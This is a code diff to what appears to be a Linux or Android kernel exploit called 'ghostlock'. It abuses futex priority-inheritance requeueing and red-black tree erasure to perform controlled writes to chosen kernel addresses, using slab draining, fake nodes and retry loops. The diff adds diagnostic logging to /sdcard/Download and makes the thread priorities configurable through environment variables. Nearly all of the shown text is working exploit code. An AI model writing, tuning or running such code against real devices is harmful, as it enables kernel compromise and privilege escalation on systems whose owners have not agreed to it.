@@ -8,6 +8,7 @@
 #include "common.h"
 #include "offsets.h"
 #include <ctype.h>
+#include <stdarg.h>
 #include <sys/ioctl.h>
 #include <sys/mman.h>
 #include <linux/perf_event.h>
@@ -209,6 +210,30 @@ static void punch_mark(const char *tag, int seq) {
   close(fd);
 }
 
+/* Diagnostic: write parent-identification experiment results */
+static void diag_log(const char *format, ...) {
+  char path[256];
+  snprintf(path, sizeof(path), "/sdcard/Download/ghostlock_diag.txt");
+  int fd = open(path, O_WRONLY | O_CREAT | O_APPEND, 0644);
+  if (fd < 0) return;
+  char buf[512];
+  va_list args;
+  va_start(args, format);
+  int n = vsnprintf(buf, sizeof(buf), format, args);
+  va_end(args);
+  if (n > 0) write(fd, buf, (size_t)n);
+  fsync(fd);
+  close(fd);
+}
+
+/* Write a single-line summary after each round */
+static void diag_round(int round, int consumer_nice, int waiter_nice,
+                        int calls, int success, int step, int crashed) {
+  diag_log("round=%d consumer_nice=%d waiter_nice=%d calls=%d success=%d "
+           "step=%d crashed=%d\n",
+           round, consumer_nice, waiter_nice, calls, success, step, crashed);
+}
+
 void *waiter_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
   int tid = (int)syscall(SYS_gettid);
@@ -219,14 +244,12 @@ void *waiter_thread(void *arg __attribute__((unused))) {
   while (!atomic_load(&owner_started)) usleep(1000);
 
   /* Phase 4: priority stratification for pi_waiters erase guard.
-   * Requeued waiter: nice=-10 (prio 110) → enters owner's pi_waiters
-   *   during requeue (110 < owner's 120).
-   * Consumer: nice=-20 (prio 100) → becomes leftmost in waiter tree
-   *   (100 < waiter's 110), so guard at 0x81ec0d0 passes:
-   *   leftmost(consumer) == task->pi_blocked_on(consumer). */
-  pr_info("waiter: boosting priority nice=-10 for PI chain (prio 110)\n");
-  if (sched_setattr_tid(tid, -10) == 0)
-    pr_info("waiter: priority boosted to nice=-10 (tid=%d)\n", tid);
+   * Requeued waiter: configurable via GHOSTLOCK_WAITER_NICE (default -10).
+   * Consumer: configurable via GHOSTLOCK_CONSUMER_NICE (default -20).
+   * owner: default nice=0 (priority 120). */
+  pr_info("waiter: setting priority nice=%d for PI chain (tid=%d)\n", g_waiter_nice, tid);
+  if (sched_setattr_tid(tid, g_waiter_nice) == 0)
+    pr_info("waiter: priority set to nice=%d (tid=%d)\n", g_waiter_nice, tid);
 
   struct timespec timeout;
   SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
@@ -260,14 +283,13 @@ void *consumer_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
   pin_to_core(CONSUMER_CORE);
 
-  /* Phase 2: boost consumer priority to match waiter (nice=-20, priority 100).
-   * Combined with Phase 1's waiter boost, both threads are now at priority 100
-   * vs owner's 120.  This tests whether the consumer's FUTEX_LOCK_PI chain walk
-   * interacts with the waiter in owner's pi_waiters (if Phase 1 put it there). */
+  /* Consumer priority: configurable via GHOSTLOCK_CONSUMER_NICE (default -20).
+   * This is the single variable for the parent-identification experiment.
+   * Changing consumer priority changes where C is inserted in the RB tree. */
   int consumer_tid = (int)syscall(SYS_gettid);
-  pr_info("consumer: boosting priority nice=-20 (tid=%d)\n", consumer_tid);
-  if (sched_setattr_tid(consumer_tid, -20) == 0)
-    pr_info("consumer: priority boosted to nice=-20\n");
+  pr_info("consumer: setting priority nice=%d (tid=%d)\n", g_consumer_nice, consumer_tid);
+  if (sched_setattr_tid(consumer_tid, g_consumer_nice) == 0)
+    pr_info("consumer: priority set to nice=%d\n", g_consumer_nice);
 
   pr_info("consumer thread running on cpu=%d\n", sched_getcpu());
   int seen = 0;
@@ -361,6 +383,8 @@ int run_main_route_threads(void) {
 
 static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) {
   pr_info("=== %s === target=0x%016zx mode=%d leaf=%d\n", desc, target, mode, leaf);
+  diag_log("=== %s === target=0x%016zx mode=%d leaf=%d consumer_nice=%d\n",
+           desc, target, mode, leaf, g_consumer_nice);
   /* leaf=1 uses the "write 0" payload (fake_right=0). __rb_erase_augmented()
    * case 1 then makes __rb_change_child() write parent->rb_right (= target)
    * with the erased node's rb_right value: fake_left is always NULL so case 1
@@ -416,6 +440,10 @@ static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) 
   }
   if (!routed) {
     pr_warning("  PI route did not produce a verified write\n");
+    diag_log("  PI route failed\n");
+  } else {
+    diag_log("  PI route ok calls=%d success=%d\n",
+             atomic_load(&consumer_calls), atomic_load(&consumer_success));
   }
   return routed;
 }
@@ -489,6 +517,8 @@ static void slab_drain(void) {
 
 int g_core_main = 0;
 int g_core_consumer = 1;
+int g_consumer_nice = -20;  /* configurable via GHOSTLOCK_CONSUMER_NICE */
+int g_waiter_nice = -10;    /* configurable via GHOSTLOCK_WAITER_NICE */
 
 void init_cpu_config(void) {
   g_core_main = 0;
@@ -533,7 +563,26 @@ void init_cpu_config(void) {
     g_core_consumer = 1;
   }
 
-  pr_info("cpu pair: main=%d consumer=%d\n", g_core_main, g_core_consumer);
+  s = getenv("GHOSTLOCK_CONSUMER_NICE");
+  if (s && *s) {
+    long v = strtol(s, NULL, 10);
+    if (v >= -20 && v <= 19) {
+      g_consumer_nice = (int)v;
+    } else {
+      pr_warning("invalid GHOSTLOCK_CONSUMER_NICE=%s; using %d\n", s, g_consumer_nice);
+    }
+  }
+  s = getenv("GHOSTLOCK_WAITER_NICE");
+  if (s && *s) {
+    long v = strtol(s, NULL, 10);
+    if (v >= -20 && v <= 19) {
+      g_waiter_nice = (int)v;
+    } else {
+      pr_warning("invalid GHOSTLOCK_WAITER_NICE=%s; using %d\n", s, g_waiter_nice);
+    }
+  }
+  pr_info("cpu pair: main=%d consumer=%d consumer_nice=%d waiter_nice=%d\n",
+          g_core_main, g_core_consumer, g_consumer_nice, g_waiter_nice);
 }
 
 static void init_runtime_paths(void) {
@@ -841,6 +890,8 @@ static int retry_write_stage(
     int leaf) {
   for (int attempt = 1; attempt <= attempts; attempt++) {
     pr_info("%s attempt %d/%d\n", stage, attempt, attempts);
+    diag_log("%s attempt %d/%d consumer_nice=%d waiter_nice=%d\n",
+             stage, attempt, attempts, g_consumer_nice, g_waiter_nice);
     if (attempt == 1) slab_drain();
     int routed = do_one_write(target, stage, mode, leaf);
     if (!routed) {
